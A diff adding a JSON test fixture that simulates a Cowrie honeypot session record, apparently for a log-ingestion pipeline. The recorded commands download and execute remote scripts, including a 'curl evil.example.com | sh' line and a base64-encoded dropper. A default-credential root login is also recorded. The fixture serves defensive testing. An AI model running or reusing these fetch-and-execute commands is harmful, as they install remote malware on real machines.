@@ -1,0 +1,30 @@
+{
+  "_comment": "Canonical golden session: shell ref + script download (with inlined bytes) whose content reveals an onward callback. content_b64 decodes to a 2-line dropper script referencing 5.6.7.8. TODO(milestone 1 exit): regenerate from a REAL stock STINGAR v2.3 doc + the new output_stingar byte-inlining — field names below are unverified against the wire.",
+  "app": "cowrie",
+  "ident": "a82be2b776ab4161911eb9114b8b1234",
+  "hostname": "sensor-dmz-1",
+  "src_ip": "59.96.137.61",
+  "session": "c0ffee010203",
+  "start_time": "2026-06-01T14:01:12Z",
+  "end_time": "2026-06-01T14:02:48Z",
+  "hp_data": {
+    "commands": [
+      "uname -a",
+      "cd /tmp; wget http://59.96.137.61/bins/x.sh; chmod +x x.sh; ./x.sh",
+      "nohup bash -c 'curl -s http://evil.example.com/drop | sh' &"
+    ],
+    "credentials": [
+      { "username": "root", "password": "vizxv", "success": true }
+    ],
+    "files": [
+      {
+        "url": "http://59.96.137.61/bins/x.sh",
+        "shasum": "8c1bd2718a3f3ba16b34a9aa05ea0ec9968fc1d402ca6f33323fbd0a1f06b1a1",
+        "resolved_ip": "59.96.137.61",
+        "content_b64": "IyEvYmluL3NoCndnZXQgaHR0cDovLzUuNi43LjgvYmlucy9taXBzOyBjaG1vZCAreCBtaXBzOyAuL21pcHMK"
+      }
+    ],
+    "client_version": "SSH-2.0-libssh2_1.4.3",
+    "unknown_stock_field": "must pass through verbatim"
+  }
+}
